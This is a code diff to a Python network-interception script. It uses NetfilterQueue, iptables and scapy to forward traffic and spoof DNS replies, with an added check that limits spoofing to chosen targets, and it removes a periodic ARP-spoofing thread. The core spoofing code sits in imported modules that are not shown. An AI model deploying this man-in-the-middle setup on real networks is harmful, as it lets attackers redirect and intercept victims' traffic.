@@ -1,8 +1,6 @@
 from netfilterqueue import NetfilterQueue
 import os
 import scapy.all as scapy
-import time
-import threading
 
 import dns_spoofing
 import arp_spoofing
@@ -25,11 +23,9 @@ def undo_iptables():
 def enable_port_forwarding():
     os.system("sudo sysctl -w net.ipv4.ip_forward=1")
 
+nfqueue = None
 def setup_proxy():
-    arp_thread_ = threading.Thread(target=arp_thread)
-    arp_thread_.daemon = True
-    arp_thread_.start()
-
+    global nfqueue
     setup_iptables()
     enable_port_forwarding()
     
@@ -40,21 +36,15 @@ def setup_proxy():
     except KeyboardInterrupt:
         undo_iptables()
         nfqueue.unbind()
-        dns_spoofing.dns_looping = False
-        arp_thread_.join()
-
-def arp_thread():
-    while dns_spoofing.dns_looping:
-        dns_spoofing.arp_tick()
-        time.sleep(5)
 
 
 def proxy(packet):
     scapy_packet = scapy.IP(packet.get_payload())
     if dns_spoofing.isDnsQuery(scapy_packet):
-        dns_spoofing.dns_spoof(scapy_packet)
-        packet.drop()
-        return
+        if dns_spoofing.isTarget(scapy_packet):
+            dns_spoofing.dns_spoof(scapy_packet)
+            packet.drop()
+            return
 
     packet.accept()
     return
